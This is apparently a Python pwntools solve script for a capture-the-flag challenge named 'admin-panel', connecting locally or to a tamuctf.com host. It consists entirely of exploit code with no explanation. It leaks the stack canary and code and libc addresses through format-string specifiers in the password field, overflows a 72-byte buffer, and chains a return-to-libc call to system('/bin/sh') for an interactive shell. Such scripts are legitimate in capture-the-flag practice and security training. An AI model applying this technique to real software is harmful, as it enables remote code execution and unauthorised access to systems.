from pwn import *

# context.log_level = "debug"
exe = ELF('./admin-panel_patched')
libc = ELF('./libc.so.6')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        b *main+327
        b *admin
        b *admin+339
        continue
    """)
elif args.REMOTE:
    io = remote("tamuctf.com", 443, ssl=True, sni="admin-panel")

# ***********************************************************
# leak canary & main
# ***********************************************************
io.sendlineafter(b'16:', b'admin')
# io.sendlineafter(b'24:', b'secretpass123%8$p-%9$p-%10$p-%11$p-%17$p-%15$p')
io.sendlineafter(b'24:', b'secretpass123___________________%15$p-%16$p')
io.recvuntil(b'admin\n')
canary, main_385 = io.recvline().strip().split(b'-')
canary, main_385 = int(canary, 16), int(main_385, 16)
main = main_385 - 385
exe.address = main - exe.sym['main']

rop = ROP(exe.path)
rop.raw(pack(canary))
rop.raw(pack(main + 380)) # ret
rop.raw(pack(main))

io.sendlineafter(b'1, 2 or 3:', b'2')
offset = 72
io.sendlineafter(b'what went wrong:', b'A' * offset + pack(canary) + rop.chain())

# 0x7ffdd365fe18: 0xdc1e97e3b5355a00
# 0x7ffdd365fdb8: 0xdc1e97e3b5355a00
# 0xdc1e97e3b5355a00 

# ***********************************************************
# leak canary & libc
# ***********************************************************
io.sendlineafter(b'16:', b'admin')
# io.sendlineafter(b'24:', b'secretpass123%8$p-%9$p-%10$p-%11$p-%17$p-%15$p')
io.sendlineafter(b'24:', b'secretpass123___________________%15$p-%27$p')
io.recvuntil(b'admin\n')
canary, libc_start_main = io.recvline().strip().split(b'-')
canary, libc_start_main = int(canary, 16), int(libc_start_main, 16)

libc.address = libc_start_main - (libc.sym['__libc_start_main'] + 235)
# print(hex(canary))
print(f'{hex(libc.address) = }')
print(f'{hex(libc.symbols["system"]) = }')
print(f'{hex(libc_start_main) = }')
# 0x7f5201ff309b
# 0x7f52021ba100

io.sendlineafter(b'1, 2 or 3:', b'2')
rop = ROP(exe)
system = libc.symbols["system"]
bin_sh = next(libc.search(b"/bin/sh"))
rop.call(system, [bin_sh])

io.sendlineafter(b'what went wrong:', b'A' * 72 + pack(canary) + b'A' * 8 + rop.chain())
io.interactive()


